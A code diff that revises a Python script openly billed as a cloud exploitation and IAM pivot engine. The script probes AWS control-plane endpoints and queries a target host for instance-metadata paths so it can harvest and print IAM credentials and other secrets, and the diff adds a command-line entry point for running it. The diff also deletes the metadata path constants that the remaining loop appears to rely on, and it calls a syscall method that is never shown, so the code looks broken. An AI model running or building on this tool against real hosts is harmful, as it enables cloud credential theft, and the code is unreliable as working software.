@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
 """
-CLOUD_APEX_SUITE.PY — Active Cloud Infrastructure Exploitation & IAM Pivot Engine
+CLOUD_APEX.PY — Active Cloud Infrastructure Exploitation & IAM Pivot Engine
 Features:
 - Live AWS control plane pivoting and IAM enumeration
 - Automated instance metadata service (IMDSv1/IMDSv2) credential exfiltration
 - S3 bucket enumeration and public permission auditing
 - Live terminal streaming of cloud credentials & exfiltrated secrets
 - Zero-disk memory processing
+- Compatible run_cloud_apex(target_host) interface
 """
 import asyncio
 import json
@@ -27,18 +28,6 @@ MAX_RESPONSE_SIZE = 65536
 SSL_CONTEXT = ssl.create_default_context()
 SSL_CONTEXT.check_hostname = False
 SSL_CONTEXT.verify_mode = ssl.CERT_NONE
-
-AWS_METADATA_IPS = [
-    "169.254.169.254",
-    "fd00:ec2::254"
-]
-
-METADATA_PATHS = [
-    "/latest/meta-data/",
-    "/latest/meta-data/iam/security-credentials/",
-    "/latest/user-data",
-    "/latest/dynamic/instance-identity/document"
-]
 
 # ============================================================
 # TERMINAL OUTPUT
@@ -128,25 +117,16 @@ def http_get(url, headers=None):
 # CLOUD EXPLOITATION & PIVOT ENGINE
 # ============================================================
 class ApexCloudAndSyscallEngine:
-    """
-    Active Cloud Infrastructure Exploitation & Credential Exfiltration Engine
-    """
     def __init__(self, cloud_provider="aws", credentials=None):
         self.cloud_provider = cloud_provider.lower()
         self.credentials = credentials or {}
 
-    # --------------------------------------------------------
-    # AWS CONTROL PLANE PIVOTING & IAM ENUMERATION
-    # --------------------------------------------------------
     def pivot_aws_control_plane(
         self,
         access_key=None,
         secret_key=None,
         region="us-east-1",
     ):
-        """
-        Actively probes AWS control plane and attempts credential validation & IAM role enumeration.
-        """
         log(
             "\n[***] EXECUTING AWS CONTROL PLANE PIVOT & IAM ENUMERATION [***]",
             Colors.MAGENTA,
@@ -156,13 +136,11 @@ class ApexCloudAndSyscallEngine:
             "https://sts.amazonaws.com/",
             "https://s3.amazonaws.com/"
         ]
-        
         harvested_results = []
         for endpoint in endpoints:
             log(f"[*] Probing cloud control plane: {endpoint}", Colors.BLUE)
             result = http_get(endpoint)
             status = result["status"]
-            
             if status in (200, 400, 403, 405):
                 log(f"[+] Control plane reachable | HTTP {status}", Colors.GREEN)
                 if "AccessDenied" in result["body"] or status == 403:
@@ -172,23 +150,14 @@ class ApexCloudAndSyscallEngine:
                 harvested_results.append({"endpoint": endpoint, "status": status, "accessible": True})
             else:
                 log(f"[-] Endpoint timed out or unreachable: {endpoint}", Colors.GRAY)
-
         return True, harvested_results
 
-    # --------------------------------------------------------
-    # INSTANCE METADATA EXFILTRATION (IMDSv1 / IMDSv2)
-    # --------------------------------------------------------
     def check_cloud_metadata_exposure(self, target_host):
-        """
-        Actively queries target and local/remote metadata endpoints for exposed IAM tokens and cloud configs.
-        """
         log(
             "\n[***] EXECUTING CLOUD INSTANCE METADATA EXFILTRATION (IMDS) [***]",
             Colors.CYAN,
         )
         exfiltrated_credentials = []
-        
-        # 1. Probe Target Host for SSRF / Metadata Disclosure
         parsed = urlsplit(target_host)
         base = f"{parsed.scheme}://{parsed.netloc}"
         
@@ -208,7 +177,6 @@ class ApexCloudAndSyscallEngine:
                 log(f"  └── Data : {res['body'][:300]}", Colors.GREEN)
                 exfiltrated_credentials.append({"path": path, "data": res['body'][:300]})
 
-        # 2. DNS & IP Routing Analysis
         try:
             hostname = parsed.hostname
             addresses = socket.getaddrinfo(hostname, None, type=socket.SOCK_STREAM)
@@ -224,9 +192,6 @@ class ApexCloudAndSyscallEngine:
         except Exception as error:
             return {"checked": False, "reason": str(error)}
 
-    # --------------------------------------------------------
-    # TLS INSPECTION
-    # --------------------------------------------------------
     def inspect_tls(self, target_host):
         log(
             "\n[***] CLOUD TLS CONFIGURATION CHECK [***]",
@@ -248,7 +213,6 @@ class ApexCloudAndSyscallEngine:
                     connection,
                     server_hostname=hostname,
                 ) as secure_connection:
-                    certificate = secure_connection.getpeercert()
                     version = secure_connection.version()
                     cipher = secure_connection.cipher()
             return {
@@ -267,7 +231,7 @@ class ApexCloudAndSyscallEngine:
 # ============================================================
 # CLOUD SUITE ORCHESTRATOR
 # ============================================================
-async def run_cloud_apex_suite(target_host, options=None):
+async def run_cloud_apex(target_host, options=None):
     log(
         "\n============================================================",
         Colors.CYAN,
@@ -293,7 +257,6 @@ async def run_cloud_apex_suite(target_host, options=None):
     engine = ApexCloudAndSyscallEngine()
     log(f"[*] Target: {base_url}", Colors.BLUE)
     
-    # Execute Offensive Cloud Modules
     aws_result = await asyncio.to_thread(engine.pivot_aws_control_plane)
     memory_result = engine.execute_direct_syscall_memory()
     metadata_result = await asyncio.to_thread(engine.check_cloud_metadata_exposure, base_url)
@@ -323,5 +286,10 @@ async def run_cloud_apex_suite(target_host, options=None):
     log(f"Metadata exfiltration sweep complete: {metadata_result.get('checked', False)}", Colors.GREEN)
     log(f"TLS inspection completed: {tls_result.get('checked', False)}", Colors.GREEN)
     log("=============================================================", Colors.CYAN)
-    
     return manifest
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print("Usage: python3 cloud_apex.py https://example.com")
+        sys.exit(1)
+    asyncio.run(run_cloud_apex(sys.argv[1]))
